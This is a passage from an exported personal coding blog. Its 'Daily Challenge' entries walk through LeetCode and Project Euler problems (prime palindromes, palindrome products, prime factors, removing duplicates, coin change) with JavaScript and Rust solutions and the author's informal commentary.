class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">866. Prime Palindrome</span><br><span class="line"></span><br><span class="line">Find the smallest prime palindrome greater than or equal to N.</span><br><span class="line"></span><br><span class="line">Recall that a number is prime if it&apos;s only divisors are 1 and itself, and it is greater than 1. </span><br><span class="line"></span><br><span class="line">For example, 2,3,5,7,11 and 13 are primes.</span><br><span class="line"></span><br><span class="line">Recall that a number is a palindrome if it reads the same from left to right as it does from right to left. </span><br><span class="line"></span><br><span class="line">For example, 12321 is a palindrome.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: 6</span><br><span class="line">Output: 7</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: 8</span><br><span class="line">Output: 11</span><br><span class="line">Example 3:</span><br><span class="line"></span><br><span class="line">Input: 13</span><br><span class="line">Output: 101</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">1 &lt;= N &lt;= 10^8</span><br><span class="line">The answer is guaranteed to exist and be less than 2 * 10^8.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>First, according to the math problem I&#39;ve done yesterday, every even-lengthed palindrome number is a multiple of eleven. So we can just skip them.</p><p>To check if a number is a prime, there is a lot of ways to do it. I once want use Miller-Rabin, but find it is so difficult to implicate it in JavaScript.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; N</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> primePalindrome = <span class="function"><span class="keyword">function</span>(<span class="params">N</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> cur = N;</span><br><span class="line">  <span class="keyword">if</span> (N &lt; <span class="number">12</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(!isPrime(cur)) ++cur;</span><br><span class="line">    <span class="keyword">return</span> cur;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(!isPal(cur)) cur++;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(isPrime(cur)) <span class="keyword">return</span> cur;</span><br><span class="line">    cur = nextPal(cur);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> isPal = <span class="function">(<span class="params">n</span>) =&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="string">""</span> + n) == (<span class="string">""</span> + n).split(<span class="string">""</span>).reverse().join(<span class="string">""</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> nextPal = <span class="function">(<span class="params">n</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> s = (<span class="string">""</span> + n);</span><br><span class="line">  <span class="keyword">let</span> len = s.length;</span><br><span class="line">  <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span>+ <span class="string">"0"</span>.repeat(len<span class="number">-1</span>) + <span class="string">"1"</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> half = <span class="built_in">Math</span>.ceil(len / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">let</span> left = s.slice(<span class="number">0</span>, half);</span><br><span class="line">    <span class="keyword">let</span> plus1 = (+left + <span class="number">1</span>) + <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">return</span> +(plus1 + plus1.slice(<span class="number">0</span>, plus1.length - <span class="number">1</span>).split(<span class="string">""</span>).reverse().join(<span class="string">""</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> isPrime = <span class="function">(<span class="params">n</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(n%<span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> n==<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>; i*i&lt;=n; i+=<span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(n%i===<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n!=<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(primePalindrome(1));</span></span><br><span class="line"><span class="comment">// console.log(primePalindrome(2));</span></span><br><span class="line"><span class="comment">// console.log(primePalindrome(3));</span></span><br><span class="line"><span class="comment">// console.log(primePalindrome(6));</span></span><br><span class="line"><span class="comment">// console.log(primePalindrome(8));</span></span><br><span class="line"><span class="comment">// console.log(primePalindrome(13));</span></span><br><span class="line"><span class="comment">// console.log(primePalindrome(11));</span></span><br><span class="line"><span class="comment">// console.log(primePalindrome(1234));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-24 Daily Challenge</title>
      <link href="/2018-12-24-Daily-Challenge/"/>
      <url>/2018-12-24-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Largest palindrome product</em> in <em>Rust</em> and <em>Remove Duplicates from Sorted Array</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Largest palindrome product</span><br><span class="line"></span><br><span class="line">Problem 4 </span><br><span class="line"></span><br><span class="line">A palindromic number reads the same both ways. The largest palindrome made from the product of two 2-digit numbers is 9009 = 91 × 99.</span><br><span class="line"></span><br><span class="line">Find the largest palindrome made from the product of two 3-digit numbers.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>I can&#39;t come up with a more gentle solution than brute force.</p><hr><p>Even that I find I can do some optimization on it.</p><p>But when check the overview I find something new. Just check my code~</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// My original solution</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num_s: <span class="built_in">String</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ok: <span class="built_in">bool</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i32</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">100</span>..<span class="number">999</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> (i..<span class="number">999</span>).rev() &#123;</span><br><span class="line">            num = i * j;</span><br><span class="line">            <span class="keyword">if</span> ans &gt; num&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num_s = num.to_string();</span><br><span class="line">            ok = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="number">0</span>..num_s.len()/<span class="number">2</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> num_s.as_bytes()[k] != num_s.as_bytes()[num_s.len()-k-<span class="number">1</span>]&#123;</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ok&#123;</span><br><span class="line">                ans = num;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">"&#123;&#125; * &#123;&#125; = &#123;&#125;"</span>, i, j, num);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optimized solution</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> num_s: <span class="built_in">String</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ok: <span class="built_in">bool</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> step: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> j: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i32</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">100</span>..<span class="number">999</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">11</span> == <span class="number">0</span> &#123;</span><br><span class="line">            step = -<span class="number">1</span>;</span><br><span class="line">            j = <span class="number">999</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            step = -<span class="number">11</span>;</span><br><span class="line">            j = <span class="number">990</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> j &gt; <span class="number">100</span> &#123;</span><br><span class="line">            num = i * j;</span><br><span class="line">            <span class="keyword">if</span> ans &gt; num&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            num_s = num.to_string();</span><br><span class="line">            ok = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="number">0</span>..num_s.len()/<span class="number">2</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> num_s.as_bytes()[k] != num_s.as_bytes()[num_s.len()-k-<span class="number">1</span>]&#123;</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ok&#123;</span><br><span class="line">                ans = num;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">"&#123;&#125; * &#123;&#125; = &#123;&#125;"</span>, i, j, num);</span><br><span class="line">            &#125;</span><br><span class="line">            j += step;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">26. Remove Duplicates from Sorted Array</span><br><span class="line"></span><br><span class="line">Given a sorted array nums, remove the duplicates in-place such that each element appear only once and return the new length.</span><br><span class="line"></span><br><span class="line">Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Given nums = [1,1,2],</span><br><span class="line"></span><br><span class="line">Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what you leave beyond the returned length.</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Given nums = [0,0,1,1,1,2,2,3,3,4],</span><br><span class="line"></span><br><span class="line">Your function should return length = 5, with the first five elements of nums being modified to 0, 1, 2, 3, and 4 respectively.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what values are set beyond the returned length.</span><br><span class="line">Clarification:</span><br><span class="line"></span><br><span class="line">Confused why the returned value is an integer but your answer is an array?</span><br><span class="line"></span><br><span class="line">Note that the input array is passed in by reference, which means modification to the input array will be known to the caller as well.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Just use two pointer/indice to deal it~</p><hr><p>I write an implication that move duplicated element to the end, but find that it&#39;s said &quot;remove&quot;~So I rewrite it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> moveDuplicates = <span class="function">(<span class="params">nums = []</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> len = nums.length;</span><br><span class="line">  <span class="keyword">if</span>(len == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> rp = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> lp = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(rp &lt; len)&#123;</span><br><span class="line">    <span class="keyword">while</span>(rp &lt; len &amp;&amp; nums[lp] == nums[rp]) ++rp;</span><br><span class="line">    <span class="keyword">if</span>(rp &lt; len &amp;&amp; rp != lp+<span class="number">1</span>)&#123;</span><br><span class="line">      [nums[lp+<span class="number">1</span>], nums[rp]] = [nums[rp], nums[lp+<span class="number">1</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[lp] &lt; nums[lp+<span class="number">1</span>]) ++lp;</span><br><span class="line">    ++rp</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> lp+<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; nums</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> removeDuplicates = <span class="function">(<span class="params">nums = []</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> len = nums.length;</span><br><span class="line">  <span class="keyword">if</span>(len &lt; <span class="number">2</span>) <span class="keyword">return</span> len;</span><br><span class="line">  <span class="keyword">let</span> rp = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> lp = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(rp &lt; len)&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums[rp] != nums[lp])&#123;</span><br><span class="line">      ++lp;</span><br><span class="line">      nums[lp] = nums[rp];</span><br><span class="line">    &#125;</span><br><span class="line">    ++rp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> lp+<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(removeDuplicates(nums));</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(removeDuplicates(nums));</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(removeDuplicates(nums));</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">0</span>,<span class="number">0</span>];</span><br><span class="line"><span class="built_in">console</span>.log(removeDuplicates(nums));</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">1</span>,<span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(removeDuplicates(nums));</span><br><span class="line"><span class="built_in">console</span>.log(nums);</span><br></pre></td></tr></table></figure><img src="/2018-12-24-Daily-Challenge/1545619672492.png" title="wwwww">]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-23 Daily Challenge</title>
      <link href="/2018-12-23-Daily-Challenge/"/>
      <url>/2018-12-23-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Largest prime factor</em> in <em>Rust</em> and <em>Coin Change</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Largest prime factor</span><br><span class="line"></span><br><span class="line">Problem 3 </span><br><span class="line"></span><br><span class="line">The prime factors of 13195 are 5, 7, 13 and 29.</span><br><span class="line"></span><br><span class="line">What is the largest prime factor of the number 600851475143 ?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>At least we know we can factorize one number $n$ in roughly $O(\sqrt{n})$time.</p><p>There is also more complicated, more fast algorithm like Pollard&#39;s rho algorithm, but writing a implication on my own cost too much and need more knowledge with Rust, so just leave it.</p><p>There is already some tools like <a href="http://factordb.com/" target="_blank" rel="noopener">factordb</a>, <a href="https://github.com/DarkenCode/yafu" target="_blank" rel="noopener">yafu</a>.</p><p>By the way, I found optimization of Rust is incredible!</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> std::vec::<span class="built_in">Vec</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> cur_num:<span class="built_in">u64</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans:<span class="built_in">u64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> target:<span class="built_in">u64</span> = <span class="number">600851475143</span>;</span><br><span class="line">    <span class="keyword">let</span> mx:<span class="built_in">u64</span> = <span class="number">600851475143</span>;</span><br><span class="line">    <span class="keyword">while</span> cur_num &lt;= target &amp;&amp; cur_num*cur_num &lt;= mx &#123;</span><br><span class="line">        <span class="keyword">while</span> target % cur_num == <span class="number">0</span> &#123;</span><br><span class="line">            target /= cur_num;</span><br><span class="line">            ans = cur_num;</span><br><span class="line">        &#125;</span><br><span class="line">        cur_num += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"answer is &#123;&#125;"</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> mx:<span class="built_in">usize</span> = <span class="number">600851475143</span>;</span><br><span class="line">    <span class="keyword">let</span> sieve = primal::Sieve::new(<span class="number">1</span>&lt;&lt;<span class="number">311475143</span>);</span><br><span class="line">    <span class="keyword">let</span> ans: <span class="built_in">Vec</span>&lt;(<span class="built_in">usize</span>, <span class="built_in">usize</span>)&gt; = <span class="keyword">match</span> sieve.factor(mx) &#123;</span><br><span class="line">        <span class="literal">Ok</span>(v) =&gt; v,</span><br><span class="line">        <span class="literal">Err</span>(_) =&gt; <span class="built_in">Vec</span>::new(),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> factor <span class="keyword">in</span> ans &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">"(&#123;&#125;, &#123;&#125;)"</span>, factor.<span class="number">0</span>, factor.<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">322. Coin Change</span><br><span class="line"></span><br><span class="line">You are given coins of different denominations and a total amount of money amount. Write a function to compute the fewest number of coins that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return -1.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: coins = [1, 2, 5], amount = 11</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: 11 = 5 + 5 + 1</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: coins = [2], amount = 3</span><br><span class="line">Output: -1</span><br><span class="line">Note:</span><br><span class="line">You may assume that you have an infinite number of each kind of coin.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I have a vague feeling this problem could be a $NP$ problem.</p><p>I guess I can do it with Dynamic Programming approach, and its time complexity is $O(coins.length*amount)$.</p><hr><p>With the help of qt, I figure out that this question is the equivalence of Knapsack Problem, so it&#39;s a $NP-Hard$ problem. Dynamic Programming is the only way I know to deal with it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; coins</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; amount</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> coinChange = <span class="function">(<span class="params">coins = [], amount</span>) =&gt;</span> &#123;</span><br><span class="line">  